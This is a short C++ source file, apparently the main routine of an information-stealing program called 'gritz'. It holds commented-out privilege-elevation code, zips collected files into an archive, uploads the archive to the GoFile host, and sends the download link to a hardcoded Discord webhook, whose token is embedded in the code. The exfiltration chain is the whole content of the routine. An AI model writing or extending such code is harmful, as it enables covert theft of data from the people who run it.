#include <gritz.h>

void gritz::cGritz::Start(char** args)
{
	gritz::paths::initPaths();

	//if (gritz::Elevation::elevate())
	//{
	//	std::cout << "hi";
	//}

	//if (args[1] == nullptr)
	//{
	//}
	//else
	//{
	//}

	//std::cin.get();

	std::string url = gritz::upload::GoFileUpload::upload(gritz::upload::zip::ZipFile::create("lolz"));

	
	Webhook hook = Webhook("https://discord.com/api/webhooks/1502985859765502035/-Kp8RTjmK6hfyy3SbgmKQl6-cBhSs09hrs13KWDnkujXQR5pf-EfK8KewmvKvfeikwIl");

	hook.setUsername("yo")
		.setContent(url);

	hook.execute();
}